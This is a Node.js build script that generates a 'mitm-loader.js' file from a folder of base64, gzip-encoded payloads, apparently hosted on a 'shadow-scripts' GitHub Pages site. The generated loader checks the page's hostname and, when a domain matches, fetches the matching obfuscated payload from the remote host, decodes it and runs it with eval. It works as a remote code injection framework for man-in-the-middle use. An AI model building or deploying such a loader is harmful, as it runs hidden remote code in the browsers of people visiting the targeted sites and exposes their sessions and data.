#!/usr/bin/env node

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const PAYLOADS_DIR = "apps/loader/public/payloads";
const OUTPUT_PATH = "apps/loader/public/scripts/mitm-loader.js";

const BASE_URL =
  process.env.BASE_URL ||
  "https://popdeuxrem.github.io/shadow-scripts/payloads";

const allPayloads = [];

const walk = (dir, prefix = "") => {
  const files = fs.readdirSync(dir);
  for (const file of files) {
    const fullPath = path.join(dir, file);
    const relPath = path.join(prefix, file);
    if (fs.statSync(fullPath).isDirectory()) {
      walk(fullPath, relPath);
    } else if (file.endsWith(".b64")) {
      allPayloads.push(relPath.replace(/\\/g, "/"));
    }
  }
};

walk(PAYLOADS_DIR);

const payloadMap = allPayloads.reduce((acc, rel) => {
  const name = rel.replace(/\.js\.b64$/, "").replace(/\.b64$/, "");
  const url = `${BASE_URL}/${rel}`;
  acc[name] = url;
  return acc;
}, {});

const loaderScript = `
// ==MITM LOADER==
// Auto-generated: ${new Date().toISOString()}

const PAYLOADS = ${JSON.stringify(payloadMap, null, 2)};

const load = async (name) => {
  const url = PAYLOADS[name];
  if (!url) {
    console.warn("[MITM] No payload found for:", name);
    return;
  }
  try {
    const res = await fetch(url);
    const encoded = await res.text();
    const raw = new Uint8Array(atob(encoded).split("").map(c => c.charCodeAt(0)));
    const decompressed = new TextDecoder().decode(pako.ungzip(raw));
    eval(decompressed);
    console.log("[MITM] ✅ Loaded payload:", name);
  } catch (err) {
    console.error("[MITM] ❌ Failed to load:", name, err);
  }
};

// Auto-execute by domain
const hostname = location.hostname;
for (const key in PAYLOADS) {
  if (hostname.includes(key)) {
    load(key);
    break;
  }
}
`;

fs.mkdirSync(path.dirname(OUTPUT_PATH), { recursive: true });
fs.writeFileSync(OUTPUT_PATH, loaderScript);

console.log(`✅ mitm-loader.js generated: ${OUTPUT_PATH}`);
